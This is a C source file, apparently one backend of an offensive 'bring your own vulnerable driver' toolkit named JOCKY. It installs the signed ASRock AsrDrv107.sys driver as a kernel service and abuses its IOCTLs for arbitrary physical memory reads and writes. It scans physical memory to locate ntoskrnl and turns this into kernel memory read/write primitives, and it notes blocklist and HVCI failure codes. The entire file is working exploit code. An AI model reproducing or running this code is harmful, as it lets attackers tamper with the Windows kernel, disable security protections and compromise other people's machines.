/*
 * backend_asrdrv107.c -- JOCKY BYOVD: AsrDrv107.sys backend
 * byovd/kernel_subverter/backend_asrdrv107.c
 *
 * Windows x64 | Clang | ring-3
 *
 * ASRock IO Driver -- physical memory R/W via MmMapIoSpace.
 * Used by Lazarus Group in BYOVD campaigns (ESET/AhnLab, 2021-2022).
 * Derives from OpenLibSys codebase (same family as WinRing0x64).
 *
 * CONFIRMED FROM BINARY SCAN + THREAT INTEL:
 *   Device:    \\.\AsrDrv107
 *   DevType:   0x9C40 (OpenLibSys)
 *   Signed:    ASRock Incorporation (WHQL)
 *
 * IOCTL SURFACE:
 *   ASR_IOCTL_READ_MEM   0x9C406104  fn=0x841 READ_ACCESS   physical read
 *   ASR_IOCTL_WRITE_MEM  0x9C40A104  fn=0x841 WRITE_ACCESS  physical write
 *   NOTE: MSR IOCTL (0x9C402084) is NOT present in this build's dispatch table.
 *         Sanity check uses physical read at PA=0x1000 instead.
 *
 * STRUCT FORMAT (identical to WinRing0 OLS_MEM_IN):
 *   Read  input:  { ULONGLONG PhysAddr, DWORD UnitSize=4, DWORD Count } (16B)
 *   Read  output: DWORD value
 *   Write input:  above header + DWORD Data (20B total)
 *
 * VA->PA STRATEGY:
 *   NtQSI(11) -> ntoskrnl KVA + SizeOfImage
 *   Physical scan 16MB->4GB in 2MB steps, match MZ+SizeOfImage
 *   delta = ntoskrnl_pa - ntoskrnl_kva
 *   pa = kva + delta  (valid for all addrs in ntoskrnl image)
 */

#include "byovd_interface.h"
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ============================================================
   CONSTANTS
   ============================================================ */

#define ASR_IOCTL_READ_MEM   0x9C406104UL
#define ASR_IOCTL_WRITE_MEM  0x9C40A104UL
#define ASR_DEVICE           "\\\\.\\AsrDrv107"
#define ASR_SVC_NAME         "AsrDrv107"

/* ============================================================
   IOCTL STRUCTS (OpenLibSys layout)
   ============================================================ */

#pragma pack(push, 1)
typedef struct {
    ULONGLONG PhysicalAddress;  /* +0x00  PHYSICAL address       */
    DWORD     UnitSize;         /* +0x08  always 4               */
    DWORD     Count;            /* +0x0C  always 1               */
} ASR_MEM_IN;                   /* = 16 bytes                    */

typedef struct {
    ULONGLONG PhysicalAddress;
    DWORD     UnitSize;
    DWORD     Count;
    DWORD     Data;             /* write value inline            */
} ASR_WRITE_IN;                 /* = 20 bytes                    */
#pragma pack(pop)

_Static_assert(sizeof(ASR_MEM_IN)   == 16, "ASR_MEM_IN must be 16 bytes");
_Static_assert(sizeof(ASR_WRITE_IN) == 20, "ASR_WRITE_IN must be 20 bytes");

/* ============================================================
   PRIVATE CONTEXT
   ============================================================ */

typedef struct {
    uint64_t ntoskrnl_kva;
    uint64_t ntoskrnl_pa;
    uint64_t ntoskrnl_size;
    int64_t  kva_pa_delta;
    BOOL     pa_resolved;
} asrdrv_ctx_t;

/* ============================================================
   RAW PHYSICAL R/W
   ============================================================ */

static BOOL _asr_read4(HANDLE dev, uint64_t pa, DWORD *out)
{
    ASR_MEM_IN in  = { .PhysicalAddress = pa, .UnitSize = 4, .Count = 1 };
    DWORD      val = 0;
    DWORD      ret = 0;

    BOOL ok = DeviceIoControl(dev,
                               ASR_IOCTL_READ_MEM,
                               &in,  sizeof(in),
                               &val, sizeof(val),
                               &ret, NULL);
    if (ok) *out = val;
    return ok;
}

static BOOL _asr_write4(HANDLE dev, uint64_t pa, DWORD val)
{
    ASR_WRITE_IN in = {
        .PhysicalAddress = pa,
        .UnitSize        = 4,
        .Count           = 1,
        .Data            = val,
    };
    DWORD ret = 0;
    return DeviceIoControl(dev,
                            ASR_IOCTL_WRITE_MEM,
                            &in,  sizeof(in),
                            NULL, 0,
                            &ret, NULL);
}

/* ============================================================
   VA->PA RESOLUTION
   ============================================================ */

static BOOL _get_ntoskrnl_info(uint64_t *kva_out, uint64_t *size_out)
{
    typedef NTSTATUS(WINAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
    NtQSI_t fn = (NtQSI_t)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!fn) return FALSE;

    ULONG need = 0;
    fn(11, NULL, 0, &need);
    need += 0x2000;

    uint8_t *buf = (uint8_t *)malloc(need);
    if (!buf) return FALSE;

    if (fn(11, buf, need, &need) != 0) { free(buf); return FALSE; }

    *kva_out  = *(uint64_t *)(buf + 4 + 0x10);
    *size_out = *(uint32_t *)(buf + 4 + 0x18);
    free(buf);
    return (*kva_out != 0);
}

static BOOL _scan_ntoskrnl_pa(HANDLE    dev,
                                uint64_t  expected_size,
                                uint64_t *pa_out)
{
    const uint64_t START = 0x1000000ULL;
    const uint64_t END   = 0x100000000ULL;
    const uint64_t STEP  = 0x200000ULL;

    printf("[asrdrv] PA scan 0x%llX-0x%llX step=2MB expected=0x%llX\n",
           (unsigned long long)START,
           (unsigned long long)END,
           (unsigned long long)expected_size);

    uint32_t probes = 0;

    for (uint64_t pa = START; pa < END; pa += STEP) {
        DWORD dw = 0;
        probes++;
        if (!_asr_read4(dev, pa, &dw))          continue;
        if ((dw & 0xFFFF) != 0x5A4D)            continue; /* MZ */

        DWORD e_lfanew = 0;
        if (!_asr_read4(dev, pa + 0x3C, &e_lfanew)) continue;
        if (e_lfanew < 0x40 || e_lfanew > 0x400)    continue;

        DWORD pe_sig = 0;
        if (!_asr_read4(dev, pa + e_lfanew, &pe_sig)) continue;
        if (pe_sig != 0x00004550)                      continue;

        /* SizeOfImage at pe_hdr+0x50 */
        DWORD soi = 0;
        if (!_asr_read4(dev, pa + e_lfanew + 0x50, &soi)) continue;
        if (soi != (DWORD)expected_size)                    continue;

        printf("[asrdrv] ntoskrnl found: PA=0x%016llX SizeOfImage=0x%lX probes=%u\n",
               (unsigned long long)pa, (unsigned long)soi, probes);
        *pa_out = pa;
        return TRUE;
    }

    printf("[asrdrv] ntoskrnl not found in first 4GB (%u probes)\n", probes);
    return FALSE;
}

/* ============================================================
   VTABLE: LOAD
   ============================================================ */

static byovd_result_t asrdrv_load(byovd_backend_t *self)
{
    char nt_path[MAX_PATH + 8] = {0};
    snprintf(nt_path, sizeof(nt_path) - 1, "\\??\\%s", self->driver_path);
    printf("[asrdrv] loading: %s\n", self->driver_path);

    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        printf("[asrdrv] OpenSCManager failed: %lu\n", GetLastError());
        return BYOVD_ERR_LOAD;
    }

    /* clean stale */
    SC_HANDLE hStale = OpenServiceA(hScm, self->svc_name, SERVICE_ALL_ACCESS);
    if (hStale) {
        SERVICE_STATUS ss = {0};
        ControlService(hStale, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        DeleteService(hStale);
        CloseServiceHandle(hStale);
        Sleep(300);
        printf("[asrdrv] stale service removed\n");
    }

    SC_HANDLE hSvc = CreateServiceA(
        hScm, self->svc_name, self->svc_name,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
        nt_path, NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
            hSvc = OpenServiceA(hScm, self->svc_name, SERVICE_ALL_ACCESS);
        if (!hSvc) {
            printf("[asrdrv] CreateService failed: %lu\n", err);
            CloseServiceHandle(hScm);
            return BYOVD_ERR_LOAD;
        }
    }

    if (!StartServiceA(hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[asrdrv] StartService failed: %lu", err);
            switch (err) {
                case    2: printf(" (path not found)");         break;
                case    5: printf(" (access denied / HVCI?)"); break;
                case 1275: printf(" (CI.dll blocklist)");       break;
                case  577: printf(" (Authenticode rejected)");  break;
            }
            printf("\n");
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hScm);
            return BYOVD_ERR_LOAD;
        }
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hScm);
    Sleep(400);
    printf("[asrdrv] driver loaded\n");
    return BYOVD_OK;
}

/* ============================================================
   VTABLE: OPEN
   ============================================================ */

static byovd_result_t asrdrv_open(byovd_backend_t *self)
{
    asrdrv_ctx_t *ctx = (asrdrv_ctx_t *)self->private_ctx;

    self->device = CreateFileA(
        ASR_DEVICE,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (self->device == INVALID_HANDLE_VALUE) {
        printf("[asrdrv] CreateFile(%s) failed: %lu\n",
               ASR_DEVICE, GetLastError());
        return BYOVD_ERR_OPEN;
    }
    printf("[asrdrv] device handle: %p\n", (void *)self->device);

    /*
     * Sanity: physical read at PA=0x1000 (real-mode IVT, always present).
     * MSR IOCTL (0x9C402084) is absent from this build's dispatch table --
     * confirmed by binary scan. Physical IOCTLs 0x9C406104/0x9C40A104
     * are confirmed present via fn=0x841 entries in scan output.
     */
    DWORD test_val = 0;
    if (!_asr_read4(self->device, 0x1000ULL, &test_val)) {
        DWORD err = GetLastError();
        printf("[asrdrv] physical read sanity FAILED at PA=0x1000: %lu\n", err);
        if (err == 87)
            printf("[asrdrv]   error=87: IOCTL 0x9C406104 rejected"
                   " -- struct mismatch or wrong code\n");
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
        return BYOVD_ERR_OPEN;
    }
    printf("[asrdrv] physical read OK: PA=0x1000 -> 0x%08lX -- IOCTLs confirmed\n",
           (unsigned long)test_val);

    /* get ntoskrnl KVA + size */
    if (!_get_ntoskrnl_info(&ctx->ntoskrnl_kva, &ctx->ntoskrnl_size)) {
        printf("[asrdrv] ntoskrnl info failed\n");
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
        return BYOVD_ERR_OPEN;
    }
    printf("[asrdrv] ntoskrnl KVA=0x%016llX size=0x%llX\n",
           (unsigned long long)ctx->ntoskrnl_kva,
           (unsigned long long)ctx->ntoskrnl_size);

    /* physical scan */
    if (!_scan_ntoskrnl_pa(self->device,
                            ctx->ntoskrnl_size,
                            &ctx->ntoskrnl_pa)) {
        printf("[asrdrv] physical scan FAILED\n");
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
        return BYOVD_ERR_OPEN;
    }

    ctx->kva_pa_delta = (int64_t)ctx->ntoskrnl_pa
                      - (int64_t)ctx->ntoskrnl_kva;
    ctx->pa_resolved  = TRUE;

    printf("[asrdrv] KVA->PA delta=0x%016llX -- physical r/w armed\n",
           (unsigned long long)(uint64_t)ctx->kva_pa_delta);
    return BYOVD_OK;
}

/* ============================================================
   VTABLE: CLOSE / UNLOAD
   ============================================================ */

static void asrdrv_close(byovd_backend_t *self)
{
    if (self->device != INVALID_HANDLE_VALUE) {
        CloseHandle(self->device);
        self->device = INVALID_HANDLE_VALUE;
    }
}

static byovd_result_t asrdrv_unload(byovd_backend_t *self)
{
    asrdrv_close(self);
    SC_HANDLE hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) return BYOVD_ERR_UNLOAD;

    SC_HANDLE hSvc = OpenServiceA(hScm, self->svc_name, SERVICE_ALL_ACCESS);
    byovd_result_t r = BYOVD_ERR_UNLOAD;
    if (hSvc) {
        SERVICE_STATUS ss = {0};
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        Sleep(300);
        if (DeleteService(hSvc)) r = BYOVD_OK;
        CloseServiceHandle(hSvc);
        printf("[asrdrv] driver unloaded\n");
    }
    CloseServiceHandle(hScm);
    return r;
}

/* ============================================================
   VTABLE: READ / WRITE
   ============================================================ */

static BOOL _kva_to_pa(asrdrv_ctx_t *ctx, uintptr_t kva, uint64_t *pa_out)
{
    if (!ctx->pa_resolved) return FALSE;
    uint64_t offset = (uint64_t)kva - ctx->ntoskrnl_kva;
    if (offset >= ctx->ntoskrnl_size) {
        printf("[asrdrv] KVA 0x%016llX outside ntoskrnl range\n",
               (unsigned long long)kva);
        return FALSE;
    }
    *pa_out = (uint64_t)((int64_t)kva + ctx->kva_pa_delta);
    return TRUE;
}

static byovd_result_t asrdrv_read(byovd_backend_t *self,
                                    uintptr_t        addr,
                                    void            *buf,
                                    size_t           size)
{
    asrdrv_ctx_t *ctx = (asrdrv_ctx_t *)self->private_ctx;
    uint64_t pa = 0;
    if (!_kva_to_pa(ctx, addr, &pa)) return BYOVD_ERR_READ;

    if (size <= 4) {
        DWORD val = 0;
        if (!_asr_read4(self->device, pa, &val)) {
            printf("[asrdrv] read%zu(PA=0x%016llX) failed: %lu\n",
                   size, (unsigned long long)pa, GetLastError());
            return BYOVD_ERR_READ;
        }
        memcpy(buf, &val, size);
        return BYOVD_OK;
    }

    /* 8-byte: two 4-byte reads */
    DWORD lo = 0, hi = 0;
    if (!_asr_read4(self->device, pa,     &lo)) {
        printf("[asrdrv] read8 lo(PA=0x%016llX) failed: %lu\n",
               (unsigned long long)pa, GetLastError());
        return BYOVD_ERR_READ;
    }
    if (!_asr_read4(self->device, pa + 4, &hi)) {
        printf("[asrdrv] read8 hi(PA=0x%016llX) failed: %lu\n",
               (unsigned long long)(pa+4), GetLastError());
        return BYOVD_ERR_READ;
    }
    uint64_t val64 = ((uint64_t)hi << 32) | (uint64_t)lo;
    memcpy(buf, &val64, 8);
    return BYOVD_OK;
}

static byovd_result_t asrdrv_write(byovd_backend_t *self,
                                     uintptr_t        addr,
                                     const void      *buf,
                                     size_t           size)
{
    asrdrv_ctx_t *ctx = (asrdrv_ctx_t *)self->private_ctx;
    uint64_t pa = 0;
    if (!_kva_to_pa(ctx, addr, &pa)) return BYOVD_ERR_WRITE;

    if (size <= 4) {
        DWORD val = 0;
        memcpy(&val, buf, size);
        if (!_asr_write4(self->device, pa, val)) {
            printf("[asrdrv] write%zu(PA=0x%016llX) failed: %lu\n",
                   size, (unsigned long long)pa, GetLastError());
            return BYOVD_ERR_WRITE;
        }
        return BYOVD_OK;
    }

    uint64_t val64 = 0;
    memcpy(&val64, buf, 8);

    if (!_asr_write4(self->device, pa,
                      (DWORD)(val64 & 0xFFFFFFFF))) {
        printf("[asrdrv] write8 lo(PA=0x%016llX) failed: %lu\n",
               (unsigned long long)pa, GetLastError());
        return BYOVD_ERR_WRITE;
    }
    if (!_asr_write4(self->device, pa + 4,
                      (DWORD)((val64 >> 32) & 0xFFFFFFFF))) {
        printf("[asrdrv] write8 hi(PA=0x%016llX) failed: %lu\n",
               (unsigned long long)(pa+4), GetLastError());
        return BYOVD_ERR_WRITE;
    }
    return BYOVD_OK;
}

/* ============================================================
   PUBLIC: BACKEND INIT
   ============================================================ */

byovd_backend_t *asrdrv107_backend_init(const char *driver_path)
{
    byovd_backend_t *b   = (byovd_backend_t *)calloc(1, sizeof(*b));
    asrdrv_ctx_t    *ctx = (asrdrv_ctx_t    *)calloc(1, sizeof(*ctx));
    if (!b || !ctx) { free(b); free(ctx); return NULL; }

    b->name        = "AsrDrv107";
    b->device      = INVALID_HANDLE_VALUE;
    b->private_ctx = ctx;

    strncpy(b->svc_name,    ASR_SVC_NAME, sizeof(b->svc_name)    - 1);
    strncpy(b->device_path, ASR_DEVICE,   sizeof(b->device_path) - 1);

    if (!GetFullPathNameA(driver_path, MAX_PATH, b->driver_path, NULL)) {
        printf("[asrdrv] GetFullPathNameA failed: %lu\n", GetLastError());
        free(ctx); free(b);
        return NULL;
    }
    if (GetFileAttributesA(b->driver_path) == INVALID_FILE_ATTRIBUTES) {
        printf("[asrdrv] driver not found: %s\n", b->driver_path);
        free(ctx); free(b);
        return NULL;
    }

    b->ops.load   = asrdrv_load;
    b->ops.open   = asrdrv_open;
    b->ops.close  = asrdrv_close;
    b->ops.unload = asrdrv_unload;
    b->ops.read   = asrdrv_read;
    b->ops.write  = asrdrv_write;

    printf("[asrdrv] backend initialised -- driver: %s\n", b->driver_path);
    return b;
}